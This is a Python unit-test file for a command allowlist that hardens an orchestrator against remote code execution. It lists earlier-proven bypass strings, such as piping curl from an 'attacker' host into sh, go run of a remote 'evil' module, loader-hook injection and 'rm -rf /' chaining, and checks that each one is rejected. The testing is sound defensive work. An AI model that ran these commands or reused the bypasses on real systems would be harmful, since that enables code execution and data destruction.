"""Unit tests for the criterion/gate-validation command allowlist.

Regression coverage for the RCE hardening. Three prior rounds of a
denylist-of-dangerous-flags design were each defeated by a new bypass class;
this suite locks in the fixed-shape allowlist that replaced it, including
every bypass string proven live against the earlier designs.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from orchestrator.criterion import confined_to_repo, is_executable_command


def test_plain_allowlisted_command_passes():
    ok, command = is_executable_command("npm run test")
    assert ok is True
    assert command == "npm run test"


def test_disallowed_first_word_rejected():
    ok, _ = is_executable_command("bash -c 'echo hi'")
    assert ok is False


def test_python_inline_code_flag_rejected():
    ok, _ = is_executable_command("python3 -c \"import os; os.system('id')\"")
    assert ok is False


def test_node_eval_flag_rejected():
    ok, _ = is_executable_command("node -e \"require('child_process').execSync('id')\"")
    assert ok is False


def test_node_print_flag_rejected():
    ok, _ = is_executable_command('node --print "1+1"')
    assert ok is False


def test_node_running_a_script_file_passes():
    ok, command = is_executable_command("node checks/whitespace-probe.js")
    assert ok is True
    assert command == "node checks/whitespace-probe.js"


def test_blocked_token_exact_match_rejected():
    ok, _ = is_executable_command("npm run rm")
    # "rm" is a whole argv token here (npm passes it as the script name), so
    # this is intentionally rejected — but a false-positive substring match
    # (e.g. a script named "confirm") must NOT be rejected, checked below.
    assert ok is False


def test_blocked_token_is_word_boundary_not_substring():
    # Regression: an old substring-based denylist rejected any command
    # merely containing "git" as a substring anywhere in the text.
    ok, command = is_executable_command("npm run configure-git-hooks")
    assert ok is True
    assert command == "npm run configure-git-hooks"


def test_npm_publish_rejected():
    # "publish" is not a recognized npm shape at all (test/ci/install/run
    # <script> only) — rejected by the closed shape set, no denylist needed.
    ok, _ = is_executable_command("npm publish --access public")
    assert ok is False


def test_git_as_first_word_still_rejected():
    ok, _ = is_executable_command("git push origin main")
    assert ok is False


def test_npm_run_script_name_must_be_a_bare_identifier():
    ok, command = is_executable_command("npm run check-fail")
    assert ok is True
    assert command == "npm run check-fail"


# Every string below was verified (by direct invocation) to bypass the
# earlier flag-denylist design and reach real execution via the plan/gate
# validation path, across three separate rounds of that design. The
# fixed-shape allowlist rejects all of them structurally (wrong token count,
# wrong subcommand adjacency, or a path argument that fails the traversal/
# absolute-path check) rather than by naming each dangerous flag.
BYPASS_STRINGS = [
    # Round 2
    'uv run bash -c "curl attacker/x|sh"',
    'uv run python3 -c "import os;os.system(1)"',
    'npx -c "id"',
    'npm exec -c "id"',
    "pnpm dlx cowsay hi",
    'pnpm exec bash -c "id"',
    "yarn dlx cowsay hi",
    "go run github.com/attacker/evil@latest",
    "make -f /tmp/evil.mk",
    # Round 3 — flag-before-subcommand, flag-after-subcommand-before-target,
    # attached short options, remote/absolute/traversal targets, loader-hook
    # injection, unguarded `-m pip`.
    'uv --directory . run bash -c "curl attacker/x|sh"',
    'uv run -- bash -c "id"',
    'uv run --with anything bash -c "id"',
    "go -C . run github.com/attacker/evil@latest",
    "cargo +nightly run",
    "cargo run --manifest-path /tmp/evil/Cargo.toml",
    "go run ../../../../tmp/evil",
    "uv run /tmp/evil.py",
    "make -fMakefile.evil",
    "make -C/tmp",
    'node --experimental-loader "data:text/javascript,evil" x.js',
    "python3 -m pip install anything",
]


def test_previously_verified_bypasses_are_now_rejected():
    for command in BYPASS_STRINGS:
        ok, _ = is_executable_command(command)
        assert ok is False, f"expected rejection, allowlist still permits: {command!r}"


LEGITIMATE_COMMANDS = [
    "uv run pytest",
    "uv run python3 checks/probe.py",
    "pytest -k test_foo",
    "pytest -m slow tests/test_x.py",
    "npm test",
    "npm ci",
    "npm install",
    "npm run build",
    "go test ./...",
    "go test ./cmd/server",
    "go build ./...",
    "go run ./cmd/server",
    "go run .",
    "make lint",
    "cargo test",
    "cargo build --release",
    "python3 checks/probe.py",
    "python3 -m pytest",
    "python -m unittest",
]


def test_legitimate_commands_still_pass():
    for command in LEGITIMATE_COMMANDS:
        ok, returned = is_executable_command(command)
        assert ok is True, f"expected allow, fix over-rejected: {command!r}"
        assert returned == command


# -- adversarial shapes beyond the previously-proven bypass strings --------


def test_flag_before_recognized_subcommand_rejected():
    for command in [
        "go -v test ./...",
        "cargo -v test",
        "uv -v run pytest",
    ]:
        ok, _ = is_executable_command(command)
        assert ok is False, command


def test_extra_trailing_tokens_rejected_not_prefix_matched():
    # No shell is ever invoked (argv array via execvp), so `&&`/`rm`/`-rf`/`/`
    # are just inert extra shlex tokens — but the shape matcher must reject
    # them outright rather than accept a valid prefix and ignore the rest.
    ok, _ = is_executable_command("make target && rm -rf /")
    assert ok is False
    ok, _ = is_executable_command("npm test extra-arg")
    assert ok is False
    ok, _ = is_executable_command("pytest tests/ && echo pwned")
    assert ok is False


def test_python_dash_m_rejects_unlisted_modules():
    ok, _ = is_executable_command("python3 -m http.server")
    assert ok is False
    ok, _ = is_executable_command("python -m pip")
    assert ok is False


def test_absolute_path_target_rejected_for_every_path_shape():
    for command in [
        "node /tmp/evil.js",
        "python3 /tmp/evil.py",
        "pytest /tmp/evil",
        "go test /tmp/evil",
        "uv run node /tmp/evil.js",
    ]:
        ok, _ = is_executable_command(command)
        assert ok is False, command


def test_traversal_target_rejected_for_every_path_shape():
    for command in [
        "node ../evil.js",
        "python3 ../../evil.py",
        "pytest ../../../etc",
        "go test ../evil",
        "go build ../../evil",
    ]:
        ok, _ = is_executable_command(command)
        assert ok is False, command


def test_uv_run_cannot_nest_another_uv_run():
    ok, _ = is_executable_command("uv run uv run pytest")
    assert ok is False


def test_uv_run_bare_path_rejected():
    # No shape allows a bare path as argv[0] — closes "uv run <script>"
    # (script executed directly, no interpreter) as an escape route.
    ok, _ = is_executable_command("uv run script.py")
    assert ok is False


# -- confined_to_repo: real-filesystem containment, including symlinks -----


def test_confined_to_repo_accepts_in_repo_path(tmp_path: Path):
    (tmp_path / "checks").mkdir()
    (tmp_path / "checks" / "probe.js").write_text("")
    assert confined_to_repo("node checks/probe.js", tmp_path) is True


def test_confined_to_repo_rejects_symlink_escaping_repo(tmp_path: Path):
    outside = tmp_path.parent / "outside_evil.js"
    outside.write_text("")
    try:
        link = tmp_path / "escape.js"
        link.symlink_to(outside)
        assert confined_to_repo("node escape.js", tmp_path) is False
    finally:
        outside.unlink(missing_ok=True)


def test_confined_to_repo_rejects_command_that_fails_shape_match():
    assert confined_to_repo("bash -c 'id'", Path(".")) is False


@pytest.mark.parametrize("target", ["./...", "."])
def test_confined_to_repo_handles_go_special_targets(tmp_path: Path, target: str):
    assert confined_to_repo(f"go test {target}", tmp_path) is True
